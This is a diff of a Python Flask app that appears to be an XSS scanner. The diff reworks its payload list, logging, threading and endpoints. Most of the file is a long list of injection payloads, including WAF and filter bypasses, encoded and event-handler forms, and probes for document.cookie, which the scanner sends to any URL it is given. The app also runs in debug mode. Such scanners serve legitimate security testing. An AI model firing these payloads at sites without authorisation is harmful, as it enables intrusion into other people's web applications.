@@ -14,10 +14,11 @@ from datetime import datetime
 import hashlib
 import random
 import string
+import queue
 
 app = Flask(__name__)
 
-class EnhancedXSSScanner:
+class AdvancedXSSScanner:
     def __init__(self):
         self.session = requests.Session()
         self.session.headers.update({
@@ -25,7 +26,7 @@ class EnhancedXSSScanner:
         })
         self.stop_scan = False
         self.scan_results = []
-        self.logs = []  # New logs collection
+        self.logs = []
         self.current_scan_id = None
         self.scan_progress = 0
         self.total_tests = 0
@@ -33,6 +34,10 @@ class EnhancedXSSScanner:
         self.total_payloads = 0
         self.parameters_found = []
         self.scan_complete = False
+        self.scan_thread = None
+        
+        # Thread-safe queue for logs
+        self.log_queue = queue.Queue()
         
         # Load enhanced payloads
         self.payloads = self.load_enhanced_payloads()
@@ -84,105 +89,127 @@ class EnhancedXSSScanner:
             '</script><script>alert("XSS_TEST_032")</script>',
             '"><svg/onload=alert("XSS_TEST_033")>',
             
-            # Additional Enhanced Payloads
-            '<script>alert("XSS_TEST_034")</script>',
-            '<img src=x onerror=alert("XSS_TEST_035")>',
-            '<svg onload=alert("XSS_TEST_036")>',
-            '<iframe src="javascript:alert(\'XSS_TEST_037\')"></iframe>',
-            '<body onload=alert("XSS_TEST_038")>',
-            '<input onfocus=alert("XSS_TEST_039") autofocus>',
-            '<select onfocus=alert("XSS_TEST_040") autofocus>',
-            '<textarea onfocus=alert("XSS_TEST_041") autofocus>',
-            '<video><source onerror="alert(\'XSS_TEST_042\')">',
-            '<audio src=x onerror=alert("XSS_TEST_043")>',
-            '<details open ontoggle=alert("XSS_TEST_044")>',
-            '<marquee onstart=alert("XSS_TEST_045")>',
-            '";alert("XSS_TEST_046");//',
-            '\';alert("XSS_TEST_047");//',
-            '<script>prompt("XSS_TEST_048")</script>',
-            '<script>confirm("XSS_TEST_049")</script>',
-            '<img src=1 href=1 onerror="javascript:alert(\'XSS_TEST_050\')">',
-            '<svg><script>alert("XSS_TEST_051")</script></svg>',
-            '<math><mi xlink:href="javascript:alert(\'XSS_TEST_052\')">test</mi></math>',
-            '<object data="javascript:alert(\'XSS_TEST_053\')">',
-            '<embed src="javascript:alert(\'XSS_TEST_054\')">',
-            '<form><button formaction="javascript:alert(\'XSS_TEST_055\')">test</button></form>',
-            '{{alert("XSS_TEST_056")}}',
-            '${alert("XSS_TEST_057")}',
-            '#{alert("XSS_TEST_058")}',
-            '<%= alert("XSS_TEST_059") %>',
+            # WAF Bypass Techniques
+            '<ScRiPt>alert("XSS_TEST_034")</ScRiPt>',
+            '<SCRIPT>alert("XSS_TEST_035")</SCRIPT>',
+            '<script>alert(/XSS_TEST_036/)</script>',
+            '<script>alert`XSS_TEST_037`</script>',
+            '<script>(alert)("XSS_TEST_038")</script>',
+            '<script>a=alert,a("XSS_TEST_039")</script>',
+            '<script>[].constructor.constructor("alert(\'XSS_TEST_040\')")()</script>',
+            
+            # Filter Bypass Techniques
+            '<svg><animatetransform onbegin=alert("XSS_TEST_041")>',
+            '<input type=image src onerror="alert(\'XSS_TEST_042\')">',
+            '<object data="javascript:alert(\'XSS_TEST_043\')">',
+            '<embed src="javascript:alert(\'XSS_TEST_044\')">',
+            '<form><button formaction="javascript:alert(\'XSS_TEST_045\')">test</button></form>',
+            
+            # Template Injection
+            '{{alert("XSS_TEST_046")}}',
+            '${alert("XSS_TEST_047")}',
+            '#{alert("XSS_TEST_048")}',
+            '<%= alert("XSS_TEST_049") %>',
+            
+            # DOM-based Payloads
+            '<script>document.write(\'<img src=x onerror=alert("XSS_TEST_050")>\')</script>',
+            '<script>document.body.innerHTML=\'<img src=x onerror=alert("XSS_TEST_051")>\'</script>',
+            '<script>setTimeout(\'alert("XSS_TEST_052")\',1)</script>',
+            '<script>Function("alert(\'XSS_TEST_053\')")()</script>',
+            
+            # Additional Event Handlers
+            '<div onload="alert(\'XSS_TEST_054\')">',
+            '<div onerror="alert(\'XSS_TEST_055\')">',
+            '<div onmouseenter="alert(\'XSS_TEST_056\')">',
+            '<div onmouseleave="alert(\'XSS_TEST_057\')">',
+            '<div onkeydown="alert(\'XSS_TEST_058\')">',
+            '<div onkeyup="alert(\'XSS_TEST_059\')">',
+            '<div onkeypress="alert(\'XSS_TEST_060\')">',
+            
+            # Encoded Payloads
+            '%3Cscript%3Ealert(%22XSS_TEST_061%22)%3C/script%3E',
+            '%3Cimg%20src=x%20onerror=alert(%22XSS_TEST_062%22)%3E',
+            '&lt;script&gt;alert("XSS_TEST_063")&lt;/script&gt;',
+            '&#60;script&#62;alert("XSS_TEST_064")&#60;/script&#62;',
+            
+            # Additional Advanced Payloads
+            '<script>alert(String.fromCharCode(88,83,83))</script>',
+            '<img src=1 href=1 onerror="javascript:alert(1)">',
+            '<svg><script>alert(1)</script></svg>',
+            '<math><mi xlink:href="javascript:alert(1)">test</mi></math>',
+            '<script>prompt(1)</script>',
+            '<script>confirm(1)</script>',
+            '";alert(1);//',
+            '\';alert(1);//',
+            '`;alert(1);//',
             '<script>alert(document.domain)</script>',
             '<script>alert(document.cookie)</script>',
             '<img src=x onerror="alert(document.domain)">',
             '<svg onload="alert(document.domain)">',
             '<iframe src="javascript:alert(document.domain)"></iframe>',
             
-            # WAF Bypass Techniques
-            '<ScRiPt>alert("XSS_TEST_060")</ScRiPt>',
-            '<SCRIPT>alert("XSS_TEST_061")</SCRIPT>',
-            '<script>alert("XSS_TEST_062")</script>',
-            '<script>alert(/XSS_TEST_063/)</script>',
-            '<script>alert`XSS_TEST_064`</script>',
-            '<script>(alert)("XSS_TEST_065")</script>',
-            '<script>a=alert,a("XSS_TEST_066")</script>',
-            '<script>[].constructor.constructor("alert(\'XSS_TEST_067\')")()</script>',
+            # More Context Breaking
+            '</title></style></textarea></script><script>alert(1)</script>',
+            '"><iframe src="javascript:alert(1)"></iframe>',
+            '\'><svg onload=alert(1)>',
+            '</noscript><img src=x onerror=alert(1)>',
             
-            # Filter Bypass Techniques
-            '<svg><animatetransform onbegin=alert("XSS_TEST_068")>',
-            '<input type=image src onerror="alert(\'XSS_TEST_069\')">',
-            '<isindex type=image src=1 onerror=alert("XSS_TEST_070")>',
-            '<object data="javascript:alert(\'XSS_TEST_071\')">',
-            '<embed src="javascript:alert(\'XSS_TEST_072\')">',
-            '<form><button formaction="javascript:alert(\'XSS_TEST_073\')">test</button></form>',
-            '<math><mi xlink:href="javascript:alert(\'XSS_TEST_074\')">test</mi></math>',
+            # Additional Filter Bypasses
+            '<img src=/ onerror=alert(1)>',
+            '<img src="" onerror=alert(1)>',
+            '<img src onerror=alert(1)>',
+            '<img/src=x/onerror=alert(1)>',
+            '<img src=x onerror=alert(1) />',
+            '<IMG SRC=x ONERROR=alert(1)>',
+            '<ImG sRc=x OnErRoR=alert(1)>',
             
-            # Template Injection
-            '{{alert("XSS_TEST_075")}}',
-            '${alert("XSS_TEST_076")}',
-            '#{alert("XSS_TEST_077")}',
-            '<%= alert("XSS_TEST_078") %>',
+            # JavaScript Protocol
+            'javascript:alert(1)',
+            'JAVASCRIPT:alert(1)',
+            'JaVaScRiPt:alert(1)',
+            'javascript&colon;alert(1)',
+            'java\tscript:alert(1)',
+            'java\nscript:alert(1)',
+            'java\rscript:alert(1)',
             
-            # DOM-based Payloads
-            '<script>document.write(\'<img src=x onerror=alert("XSS_TEST_079")>\')</script>',
-            '<script>document.body.innerHTML=\'<img src=x onerror=alert("XSS_TEST_080")>\'</script>',
-            '<script>eval(location.hash.slice(1))</script>#alert("XSS_TEST_081")',
-            '<script>setTimeout(\'alert("XSS_TEST_082")\',1)</script>',
-            '<script>setInterval(\'alert("XSS_TEST_083")\',1000)</script>',
-            '<script>Function("alert(\'XSS_TEST_084\')")()</script>',
+            # Data URI
+            'data:text/html,<script>alert(1)</script>',
+            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
             
-            # Additional Event Handlers
-            '<div onload="alert(\'XSS_TEST_085\')">',
-            '<div onerror="alert(\'XSS_TEST_086\')">',
-            '<div onmouseenter="alert(\'XSS_TEST_087\')">',
-            '<div onmouseleave="alert(\'XSS_TEST_088\')">',
-            '<div onkeydown="alert(\'XSS_TEST_089\')">',
-            '<div onkeyup="alert(\'XSS_TEST_090\')">',
-            '<div onkeypress="alert(\'XSS_TEST_091\')">',
-            '<div onblur="alert(\'XSS_TEST_092\')">',
-            '<div onfocus="alert(\'XSS_TEST_093\')">',
-            '<div onresize="alert(\'XSS_TEST_094\')">',
-            '<div onscroll="alert(\'XSS_TEST_095\')">',
-            
-            # Encoded Payloads
-            '%3Cscript%3Ealert(%22XSS_TEST_096%22)%3C/script%3E',
-            '%3Cimg%20src=x%20onerror=alert(%22XSS_TEST_097%22)%3E',
-            '&lt;script&gt;alert("XSS_TEST_098")&lt;/script&gt;',
-            '&#60;script&#62;alert("XSS_TEST_099")&#60;/script&#62;',
-            '<script>alert("XSS_TEST_100")</script>',
+            # More Event Handlers
+            '<body onpageshow=alert(1)>',
+            '<body onfocus=alert(1)>',
+            '<body onhashchange=alert(1)>',
+            '<body onmessage=alert(1)>',
+            '<body onoffline=alert(1)>',
+            '<body ononline=alert(1)>',
+            '<body onpagehide=alert(1)>',
+            '<body onpopstate=alert(1)>',
+            '<body onresize=alert(1)>',
+            '<body onstorage=alert(1)>',
+            '<body onunload=alert(1)>',
+            '<body onbeforeunload=alert(1)>',
         ]
         return payloads
     
     def add_log(self, log_type, message, parameter=None, payload=None, result=None):
-        """Add log entry with timestamp"""
+        """Add log entry with timestamp - thread safe"""
         log_entry = {
-            'timestamp': datetime.now().strftime('%H:%M:%S'),
+            'timestamp': datetime.now().strftime('%H:%M:%S.%f')[:-3],
             'type': log_type,
             'message': message,
             'parameter': parameter,
             'payload': payload,
             'result': result
         }
+        self.log_queue.put(log_entry)
+        
+        # Also add to logs list for immediate access
         self.logs.append(log_entry)
+        
+        # Keep only last 1000 logs to prevent memory issues
+        if len(self.logs) > 1000:
+            self.logs = self.logs[-1000:]
     
     def extract_payload_id(self, payload):
         """Extract unique ID from payload for tracking"""
@@ -230,7 +257,8 @@ class EnhancedXSSScanner:
         
         try:
             # Log payload testing start
-            self.add_log('info', f'Testing payload on parameter: {param_name}', param_name, payload[:50] + '...' if len(payload) > 50 else payload)
+            payload_preview = payload[:50] + '...' if len(payload) > 50 else payload
+            self.add_log('info', f'Testing payload on parameter: {param_name}', param_name, payload_preview)
             
             # Parse URL and add payload to parameter
             parsed_url = urllib.parse.urlparse(url)
@@ -272,9 +300,9 @@ class EnhancedXSSScanner:
             
             # Log result
             if is_executed:
-                self.add_log('success', f'VULNERABILITY FOUND! Parameter: {param_name}', param_name, payload[:30] + '...', 'Vulnerable')
+                self.add_log('success', f'🚨 VULNERABILITY FOUND! Parameter: {param_name} | Confidence: {confidence}', param_name, payload_preview, 'VULNERABLE')
             else:
-                self.add_log('info', f'No vulnerability found for parameter: {param_name}', param_name, payload[:30] + '...', 'Safe')
+                self.add_log('info', f'✅ No vulnerability - Parameter: {param_name} | Status: {response.status_code}', param_name, payload_preview, 'Safe')
             
             # Update progress correctly
             self.completed_tests += 1
@@ -285,13 +313,13 @@ class EnhancedXSSScanner:
         except Exception as e:
             self.completed_tests += 1
             self.scan_progress = (self.completed_tests / self.total_tests) * 100 if self.total_tests > 0 else 0
-            self.add_log('error', f'Error testing parameter {param_name}: {str(e)}', param_name, payload[:30] + '...', 'Error')
+            self.add_log('error', f'❌ Error testing parameter {param_name}: {str(e)}', param_name, payload_preview, 'Error')
             return {'error': str(e), 'parameter': param_name, 'payload': payload}
     
     def crawl_url(self, url):
         """Enhanced URL crawling with logging"""
         try:
-            self.add_log('info', f'Starting crawl of target URL: {url}')
+            self.add_log('info', f'🔍 Starting crawl of target URL: {url}')
             response = self.session.get(url, timeout=10)
             soup = BeautifulSoup(response.content, 'html.parser')
             
@@ -323,12 +351,14 @@ class EnhancedXSSScanner:
             # Log discovered parameters
             if params:
                 param_names = list(params.keys())
-                self.add_log('success', f'Found {len(param_names)} URL parameters: {", ".join(param_names)}')
+                self.add_log('success', f'✅ Found {len(param_names)} URL parameters: {", ".join(param_names)}')
             else:
-                self.add_log('warning', 'No URL parameters found, will test common parameter names')
+                self.add_log('warning', f'⚠️ No URL parameters found, will test common parameter names')
             
             if forms:
-                self.add_log('success', f'Found {len(forms)} forms with input fields')
+                self.add_log('success', f'📝 Found {len(forms)} forms with input fields')
+            
+            self.add_log('info', f'📊 Response: {response.status_code} | Size: {len(response.content)} bytes')
             
             return {
                 'forms': forms,
@@ -339,7 +369,7 @@ class EnhancedXSSScanner:
             }
             
         except Exception as e:
-            self.add_log('error', f'Error crawling URL: {str(e)}')
+            self.add_log('error', f'❌ Error crawling URL: {str(e)}')
             return {'error': str(e)}
     
     def scan_url(self, target_url, scan_id):
@@ -347,13 +377,13 @@ class EnhancedXSSScanner:
         self.current_scan_id = scan_id
         self.stop_scan = False
         self.scan_results = []
-        self.logs = []  # Reset logs for new scan
+        self.logs = []
         self.scan_progress = 0
         self.completed_tests = 0
         self.scan_complete = False
         
         # Log scan start
-        self.add_log('info', f'Starting XSS vulnerability scan for: {target_url}')
+        self.add_log('info', f'🚀 Starting XSS vulnerability scan for: {target_url}')
         
         results = {
             'target_url': target_url,
@@ -386,26 +416,26 @@ class EnhancedXSSScanner:
             parameters_to_test.extend(list(crawl_data['params'].keys()))
         else:
             # If no parameters found, try common ones
-            parameters_to_test = ['q', 'search', 'query', 'id', 'page', 'url', 'redirect', 'return', 'callback', 'name', 'value', 'data']
-            self.add_log('info', f'Testing common parameters: {", ".join(parameters_to_test)}')
+            parameters_to_test = ['q', 'search', 'query', 'id', 'page', 'url', 'redirect', 'return', 'callback', 'name', 'value', 'data', 'input', 'text', 'keyword']
+            self.add_log('info', f'🔧 Testing common parameters: {", ".join(parameters_to_test)}')
         
         self.parameters_found = parameters_to_test
         self.total_tests = len(self.payloads) * len(parameters_to_test)
         results['scan_summary']['total_tests'] = self.total_tests
         
-        self.add_log('info', f'Scan plan: {len(self.payloads)} payloads × {len(parameters_to_test)} parameters = {self.total_tests} total tests')
+        self.add_log('info', f'📋 Scan plan: {len(self.payloads)} payloads × {len(parameters_to_test)} parameters = {self.total_tests} total tests')
         
         vulnerabilities = []
         
         # Test each payload on each parameter
-        for param_name in parameters_to_test:
+        for param_index, param_name in enumerate(parameters_to_test):
             if self.stop_scan:
-                self.add_log('warning', 'Scan stopped by user')
+                self.add_log('warning', '⏹️ Scan stopped by user')
                 break
                 
-            self.add_log('info', f'Starting tests for parameter: {param_name}')
+            self.add_log('info', f'🎯 Starting tests for parameter: {param_name} ({param_index + 1}/{len(parameters_to_test)})')
             
-            for payload in self.payloads:
+            for payload_index, payload in enumerate(self.payloads):
                 if self.stop_scan:
                     break
                     
@@ -427,8 +457,13 @@ class EnhancedXSSScanner:
                     else:
                         results['scan_summary']['low_confidence'] += 1
                 
+                # Progress update every 10 payloads
+                if (payload_index + 1) % 10 == 0:
+                    progress_percent = (self.completed_tests / self.total_tests) * 100
+                    self.add_log('info', f'📈 Progress: {progress_percent:.1f}% | Tested: {self.completed_tests}/{self.total_tests} | Found: {len(vulnerabilities)} vulnerabilities')
+                
                 # Small delay to prevent overwhelming the server
-                time.sleep(0.1)
+                time.sleep(0.05)
         
         # Mark scan as complete
         self.scan_complete = True
@@ -436,7 +471,10 @@ class EnhancedXSSScanner:
         
         # Log scan completion
         vuln_count = len(vulnerabilities)
-        self.add_log('success', f'Scan completed! Found {vuln_count} vulnerabilities out of {self.total_tests} tests')
+        if vuln_count > 0:
+            self.add_log('success', f'🎉 Scan completed! Found {vuln_count} vulnerabilities out of {self.total_tests} tests')
+        else:
+            self.add_log('success', f'✅ Scan completed! No vulnerabilities found in {self.total_tests} tests - Target appears secure')
         
         results['vulnerabilities'] = vulnerabilities
         results['scan_summary']['total_vulnerabilities'] = len(vulnerabilities)
@@ -449,7 +487,7 @@ class EnhancedXSSScanner:
     def stop_scanning(self):
         """Stop the current scan"""
         self.stop_scan = True
-        self.add_log('warning', 'Scan stop requested by user')
+        self.add_log('warning', '🛑 Scan stop requested by user')
     
     def get_scan_progress(self):
         """Get current scan progress with fixed calculation"""
@@ -462,9 +500,13 @@ class EnhancedXSSScanner:
             'vulnerabilities_found': len(self.scan_results),
             'scan_complete': self.scan_complete
         }
+    
+    def get_logs(self):
+        """Get all logs"""
+        return self.logs.copy()
 
 # Global scanner instance
-scanner = EnhancedXSSScanner()
+scanner = AdvancedXSSScanner()
 
 @app.route('/')
 def index():
@@ -479,14 +521,24 @@ def scan():
     if not target_url:
         return jsonify({'error': 'URL is required'})
     
+    # Reset scanner state
+    scanner.scan_results = []
+    scanner.logs = []
+    scanner.scan_complete = False
+    scanner.stop_scan = False
+    
     # Start scan in background thread
     def run_scan():
-        results = scanner.scan_url(target_url, scan_id)
-        return results
+        try:
+            results = scanner.scan_url(target_url, scan_id)
+            return results
+        except Exception as e:
+            scanner.add_log('error', f'❌ Scan failed: {str(e)}')
+            return {'error': str(e)}
     
-    thread = threading.Thread(target=run_scan)
-    thread.daemon = True
-    thread.start()
+    scanner.scan_thread = threading.Thread(target=run_scan)
+    scanner.scan_thread.daemon = True
+    scanner.scan_thread.start()
     
     return jsonify({'status': 'started', 'scan_id': scan_id})
 
@@ -508,11 +560,20 @@ def scan_status(scan_id):
 
 @app.route('/scan_logs/<scan_id>')
 def scan_logs(scan_id):
-    """New endpoint to fetch scan logs"""
-    if scanner.current_scan_id == scan_id:
-        return jsonify({'logs': scanner.logs})
+    """Enhanced endpoint to fetch scan logs"""
+    if scanner.current_scan_id == scan_id or scan_id == 'current':
+        logs = scanner.get_logs()
+        return jsonify({
+            'logs': logs,
+            'total_logs': len(logs),
+            'scan_id': scan_id
+        })
     else:
-        return jsonify({'logs': []})
+        return jsonify({
+            'logs': [],
+            'total_logs': 0,
+            'scan_id': scan_id
+        })
 
 @app.route('/stop_scan', methods=['POST'])
 def stop_scan():
@@ -550,5 +611,9 @@ def export_csv():
         headers={'Content-Disposition': 'attachment; filename=xss_scan_results.csv'}
     )
 
+@app.route('/health')
+def health():
+    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})
+
 if __name__ == '__main__':
-    app.run(debug=True, threaded=True)
+    app.run(debug=True, threaded=True, port=5000)
